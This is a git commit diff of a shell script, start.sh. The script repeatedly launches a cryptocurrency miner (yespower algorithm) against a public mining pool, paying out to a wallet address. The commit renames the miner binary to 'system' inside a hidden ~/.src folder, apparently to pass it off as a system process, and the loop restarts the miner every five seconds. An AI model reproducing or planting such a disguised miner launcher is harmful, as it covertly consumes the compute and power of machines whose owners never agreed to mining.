53caf5ac9f35de03eff57fc7589bb31b8a62d555
Dwi Haryanti <87308298+dwihrynti@users.noreply.github.com>
2021-08-03 19:02:03 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 while [ 1 ]; do
-	~/.src/linux -a yespower  -o stratum+tcps://stratum-asia.rplant.xyz:13350 -u VUiJhdmJucwL4SHQZedXeKcr97Q669G7Re.jp
+	~/.src/linux/system -a yespower  -o stratum+tcps://stratum-asia.rplant.xyz:13350 -u VUiJhdmJucwL4SHQZedXeKcr97Q669G7Re.jp
 	sleep 5
 done
